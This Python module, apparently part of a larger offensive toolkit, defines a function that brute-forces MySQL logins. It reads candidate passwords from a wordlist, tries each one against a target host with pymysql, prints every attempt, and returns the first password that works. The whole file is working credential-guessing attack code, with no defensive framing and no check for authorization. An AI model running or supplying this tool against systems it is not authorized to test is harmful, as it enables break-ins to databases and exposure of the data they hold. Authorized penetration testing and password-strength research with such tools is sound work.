import pymysql
from typing import Optional
from .utils import clear_line


def mysql_bruteforce(
    host: str, username: str, wordlist_path: str, port: int = 3306
) -> Optional[str]:
    """
    Attempt MySQL brute force attack using a password wordlist.

    Args:
        host (str): Target hostname or IP address.
        username (str): Username to authenticate.
        wordlist_path (str): Path to file containing passwords (one per line).
        port (int): MySQL port. Defaults to 3306.

    Returns:
        Optional[str]: The password if authentication succeeds; otherwise None.
    """
    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()

            clear_line()
            print(f"[?] Trying MySQL password: {password}", end="\r")
            try:
                conn = pymysql.connect(
                    host=host,
                    user=username,
                    password=password,
                    port=port,
                    connect_timeout=3,
                )
                print(f"[+] MySQL login succeeded: {username}:{password}")
                conn.close()
                return password
            except pymysql.err.OperationalError:
                clear_line()
                print(f"[-] MySQL login failed for {username}:{password}", end="\r")
                continue
            except Exception as e:
                clear_line()
                print(
                    f"Connection error or other MYSQL issues: {e}. Continuing...",
                    end="\r",
                )
                continue
    return None
